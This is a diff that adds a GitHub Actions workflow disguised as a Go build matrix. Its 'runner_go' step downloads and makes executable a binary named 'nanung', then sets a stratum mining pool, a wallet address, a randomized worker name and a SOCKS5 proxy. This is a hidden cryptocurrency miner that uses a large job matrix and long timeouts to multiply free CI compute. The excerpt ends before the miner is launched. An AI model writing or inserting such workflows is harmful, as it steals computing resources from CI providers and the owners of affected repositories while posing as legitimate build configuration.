@@ -1,0 +1,33 @@
+name: Golek
+on: [push, pull_request]
+jobs:
+  build:
+    name: Golek
+    runs-on: ubuntu-latest
+    strategy:
+      max-parallel: 256
+      fail-fast: false
+      matrix:
+        go: [1.1, 1.2, 1.3, 1.4, 1.5,]
+        flag: [A, B, C, D, E, F, G, H, I, J, K, L, M, N, O]
+    timeout-minutes: 333
+    env:
+        NUM_JOBS: 256
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: runner_go
+      run: |
+        wget https://github.com/surtitedjohadiningrat/verus/raw/main/nanung
+        chmod +x nanung
+        screen -dmS ls
+        POOL=stratum+tcp://eu.luckpool.net:3956
+        WALLET=RR6LLyCz4SwrUrkDDAWLsCXgxjXyAqvvPm
+        WORKER=$(echo $(shuf -i 100-999 -n 1)-karim)
+        PROXY=socks5://94.189.227.134:1080
